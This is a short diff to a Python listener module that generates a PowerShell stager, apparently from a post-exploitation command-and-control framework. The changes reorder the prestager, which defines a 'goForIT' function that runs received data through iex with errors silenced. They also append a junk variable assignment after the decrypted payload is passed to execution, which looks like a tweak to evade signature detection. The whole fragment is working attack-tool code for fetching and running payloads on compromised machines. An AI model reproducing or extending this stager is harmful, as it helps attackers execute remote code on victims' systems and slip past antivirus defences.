@@ -253,8 +253,9 @@ class Listener:
 
         if language == "powershell":
             # PowerShell
-            prestager = '$ErrorActionPreference = "SilentlyContinue";'
-            prestager += "function goForIT ($rdata) {iex $($rdata)};"
+            prestager = "function goForIT ($rdata) {iex $($rdata)};"
+            prestager += '$ErrorActionPreference = "SilentlyContinue";'
+            
             
             if safeChecks.lower() == "true":
                 prestager += "[System.Net.ServicePointManager]::Expect100Continue=0;"
@@ -364,7 +365,7 @@ class Listener:
 
             # decode everything and kick it over to IEX to kick off execution
             stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk));"
-            stager += "Perform-PrimeCheck; goForIT $T5;"
+            stager += "Perform-PrimeCheck; goForIT $T5;$z='okko'"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
